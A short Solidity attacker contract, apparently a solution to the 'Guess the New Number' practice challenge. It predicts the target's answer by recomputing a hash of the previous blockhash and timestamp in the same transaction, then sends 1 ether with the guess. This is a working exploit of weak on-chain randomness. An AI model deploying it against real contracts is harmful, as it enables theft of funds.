/**
 *Submitted for verification at Etherscan.io on 2022-01-29
*/

pragma solidity ^0.8.0;

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttacker {
    address public _contractAddress;
    address payable private owner;
    constructor(address contractAddress_) payable {
        _contractAddress = contractAddress_;
        owner = payable(msg.sender);
    }

    function attackContract() public payable {
        require(address(this).balance >= 1 ether, "not enough funds");
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        IGuessTheNewNumberChallenge(_contractAddress).guess{value: 1 ether}(answer);

        // require(IGuessTheNewNumberChallenge(_contractAddress).isComplete(), "challenge not completed");
        // return all of it to EOA
    }

    function withdrawBalance(uint amount) public{
        owner.transfer(amount);
    }
}